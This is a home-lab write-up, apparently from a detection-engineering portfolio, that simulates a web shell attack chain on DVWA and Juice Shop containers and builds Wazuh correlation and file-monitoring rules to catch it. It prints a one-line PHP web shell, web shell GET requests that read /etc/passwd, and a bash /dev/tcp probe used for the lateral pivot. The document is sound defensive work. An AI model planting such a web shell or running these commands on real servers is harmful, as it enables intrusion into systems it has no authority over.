# Lateral Movement Detection: Web Shell Execution to Persistence — Attack Chain Correlation

## Overview

This project simulates a realistic post-exploitation attack chain — initial access via a web shell, discovery/enumeration, lateral pivot toward a second container, and a persistence attempt — and builds Wazuh detection covering each stage. Unlike the previous detection projects (which focused on single-technique patterns like beaconing timing or DNS query structure), this project specifically addresses **attack chain correlation**: connecting multiple, individually low-signal events across different detection surfaces into a single high-confidence alert that reflects the attacker's actual intent rather than any isolated action.

This represents the most operationally realistic scenario in the lab — web shell exploitation followed by discovery and persistence is a well-documented, commonly observed attack pattern in real incident response engagements, and detecting it requires exactly the kind of multi-event, time-windowed correlation that distinguishes mature SOC detection engineering from simple log monitoring.

## Environment

- **Attack surface:** DVWA (Damn Vulnerable Web Application), Docker container with Apache web server, pre-placed PHP web shell (`shell.php`) simulating a successful file upload exploit from the earlier DVWA project
- **Secondary target:** OWASP Juice Shop container, reachable from the DVWA container via Docker bridge network IP (demonstrating the pivot path)
- **Monitoring:** Wazuh agent on the Docker host, with:
  - Apache access log volume-mounted from the DVWA container to the host filesystem (`~/dvwa-logs/access.log`), making it readable by the host-based agent
  - FIM realtime monitoring enabled on `/tmp` (a classic attacker drop zone)
  - Pre-existing DNS tunnel and C2 beacon simulators running in the background, deliberately left active to create a realistic "noisy environment" where the lateral movement events had to stand out against other ongoing detections

## The Attack Chain

All five steps were executed manually, with distinct timestamps between each to demonstrate sequential progression:

### Step 1 — Initial Access: Remote Code Execution via Web Shell
```
GET /hackable/uploads/shell.php?cmd=id
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Confirmed RCE as the web server process user. The web shell is a single-line PHP payload (`<?php system($_GET['cmd']); ?>`) placed directly into DVWA's upload directory — the same technique demonstrated in the DVWA attack traffic project, now used as the entry point for a broader attack chain rather than a standalone demonstration.

### Step 2 — Discovery/Enumeration
```
GET /hackable/uploads/shell.php?cmd=hostname
GET /hackable/uploads/shell.php?cmd=cat+/etc/passwd
GET /hackable/uploads/shell.php?cmd=ip+addr
```
Standard post-exploitation discovery: identify the host, enumerate users, map the network. Each command generates a distinct, logged HTTP GET request with the command visible in plaintext in the URL — a key visibility advantage of GET-based web shells over more sophisticated C2 implants.

### Step 3 — Lateral Pivot Attempt
```
GET /hackable/uploads/shell.php?cmd=bash+-c+'echo+>/dev/tcp/172.17.0.x/3000'
```
Used the web shell to attempt a TCP connection from the DVWA container to the Juice Shop container's port 3000 — confirmed reachable (connection succeeded), demonstrating the pivot path exists. In a real attack, this step would precede dropping a second-stage payload on the pivot target.

### Step 4 — Persistence: File Drop on Host /tmp
```bash
printf '#!/bin/bash\n# persistence\n' | sudo tee /tmp/attacker_persistence.sh
```
A simulated persistence script dropped into `/tmp` — world-writable, no special permissions required, and a classic attacker staging location. Detected immediately by Wazuh's realtime FIM monitoring.

## Visibility Gap Encountered and Resolved

Initial testing showed no Wazuh alerts from the web shell commands despite them executing successfully — the same visibility gap encountered in the Juice Shop project. DVWA's Apache web server runs inside the Docker container, and its access logs (`/var/log/apache2/access.log`) are only accessible inside the container by default. The host-based Wazuh agent has no visibility into container-internal log files.

**Resolution:** DVWA was redeployed with a Docker volume mount exposing its Apache log directory to the host filesystem:
```bash
docker run -d --name dvwa \
  -p 8082:80 \
  -v ~/dvwa-logs:/var/log/apache2 \
  vulnerables/web-dvwa
```
This single architectural change — a volume mount — immediately gave the Wazuh agent full visibility into every HTTP request hitting the web application, including the `?cmd=` parameters that identify web shell usage. The agent's `ossec.conf` was updated with a `<localfile>` entry pointing at `/home/cyberuser/dvwa-logs/access.log` with `log_format: apache`.

This is the third time in this lab that a visibility gap has been encountered and resolved via log collection architecture rather than rule logic — a recurring theme that reinforces the principle that **detection engineering is only as good as the data it receives.**

## Detection Rules

### Discovery: Built-in Rule 31514

Wazuh ships a built-in rule specifically for web shell access:

```
Rule 31514 (level 6): "Simple shell.php command execution."
MITRE: T1505.003 (Web Shell), T1203 (Exploitation for Client Execution)
Compliance: GDPR IV_35.7.d, PCI-DSS 6.5/11.4, NIST SA.11/SI.4
```

This rule was confirmed working against the Apache access log format via `wazuh-logtest` before building any custom rules on top of it — demonstrating that checking existing coverage before writing from scratch is standard practice, not a shortcut. The built-in rule also comes with full compliance framework and MITRE ATT&CK mappings automatically, which custom rules would need to replicate manually.

### Custom Rule 100051: Persistence File Drop Detection

```xml
<rule id="100051" level="6">
  <if_sid>554</if_sid>
  <field name="file">/tmp</field>
  <description>New file created in /tmp - possible attacker persistence</description>
  <group>local,lateral_movement,persistence,attack,</group>
</rule>
```

Chains off Wazuh's built-in FIM rule 554 ("File added to the system"), narrowing specifically to files created in `/tmp` — a high-value signal since legitimate applications rarely write executables or scripts there, while attackers frequently use it as a staging area precisely because it's world-writable and often less monitored than application directories.

### Custom Rule 100053: Attack Chain Correlation (Level 14)

```xml
<rule id="100053" level="14" frequency="3" timeframe="300">
  <if_matched_sid>31514</if_matched_sid>
  <same_source_ip />
  <description>LATERAL MOVEMENT: Multiple web shell commands from same source - active attack chain</description>
  <group>local,lateral_movement,attack_chain,webshell,</group>
</rule>
```

This is the core correlation rule — fires when the same source IP triggers the web shell detection rule (31514) **3 or more times within a 5-minute window**. The `<same_source_ip />` element ensures correlation is source-specific (an attacker systematically running commands through the web shell) rather than triggering on scattered web shell hits from multiple sources.

**Why frequency-based rather than single-event:** a single web shell hit could be an automated scanner, a misconfigured health check, or a false positive. Three hits from the same source within 5 minutes is a deliberate pattern — an attacker working through a sequence of discovery commands. The rule encodes this judgment directly into the detection threshold.

**Level 14** — the highest severity alert in this entire lab's rule set. `mail: True` in the logtest output confirms Wazuh would trigger email notification for this alert if configured, appropriate for what is effectively a confirmed active compromise.

## The Full Alert Picture

The overview screenshot is deliberately unfiltered — the DNS tunnel alerts (100041) from the earlier project running in the background are intentionally visible. This reflects the real SOC analyst experience: lateral movement events don't arrive in isolation against a clean background, they arrive mixed with other ongoing detections. The ability to identify the lateral movement pattern (31514 → 100051 → 100053 in sequence, same agent, short timeframe) within a noisy alert feed is the actual operational skill, and the screenshot demonstrates that environment authentically.

## Infrastructure Issues Encountered

**Docker port binding stale after reboot:** DVWA's port 8082 mapping showed correctly in `docker ps` but was unreachable externally after a container restart. Resolved by a clean `docker stop`/`docker start` cycle, which forced Docker to re-establish the iptables NAT rule. The underlying cause: Docker's port forwarding relies on iptables DNAT rules that can become stale after network disruptions, even when the container's configuration is otherwise intact.

**Windows network profile reverting to Public:** The Hyper-V internal switch adapter reverted to "Public" network profile after a reboot, silently blocking traffic from the Windows host to the lab subnet (Windows Firewall applies stricter default rules to Public profile adapters). Resolved by setting the profile back to "Private" via `Set-NetConnectionProfile`. This is a recurring issue in this lab that warrants a permanent startup task fix.

**Container-to-container connectivity via IP not hostname:** DVWA and Juice Shop are both on Docker's default bridge network, which does not provide automatic DNS resolution between containers (unlike custom Docker networks). Direct IP addressing was used for the pivot step rather than container name resolution.

## Skills Demonstrated

- Full attack chain simulation (initial access → discovery → lateral movement → persistence) against a realistic multi-container environment
- Log collection architecture design for containerized applications (volume mounts to expose container logs to host-based agents)
- Detection rule design using built-in rules as foundations rather than building from scratch
- Frequency/timeframe correlation using `<same_source_ip />` to detect behavioral patterns rather than individual events
- MITRE ATT&CK awareness: T1505.003 (Web Shell), T1203 (Exploitation for Client Execution), T1021 (Remote Services/Lateral Movement)
- Docker networking diagnostics (bridge vs custom networks, stale iptables NAT rules, port binding verification)
- Windows/Hyper-V networking troubleshooting (network profile management, ICS persistence)
- Operating in a noisy environment — executing and detecting a specific attack chain while other detections (DNS tunneling, C2 beaconing) run simultaneously

## Limitations and Follow-Up Work

- Rule 100053 correlates web shell hits from the same source IP, but does not directly connect the web shell activity to the FIM persistence event in a single unified alert — a true cross-technique correlation rule (web shell AND file drop within the same timeframe) requires Wazuh's active-response framework or an external SOAR integration, which is beyond native rule syntax
- The pivot step (TCP connection to Juice Shop) was confirmed successful but generated no Wazuh alert — network-level lateral movement visibility requires a network IDS (e.g., Suricata) watching container bridge traffic, which is identified as the next project
- Persistence was simulated by dropping a file on the host `/tmp` directly (not from inside the container), which is a simplification — in a real attack, the persistence mechanism would be deployed from within the compromised container environment
- The web shell's GET-based command execution is intentionally easy to detect (commands visible in URL) — real attackers typically use POST-based shells or encrypted C2 implants specifically to avoid this visibility
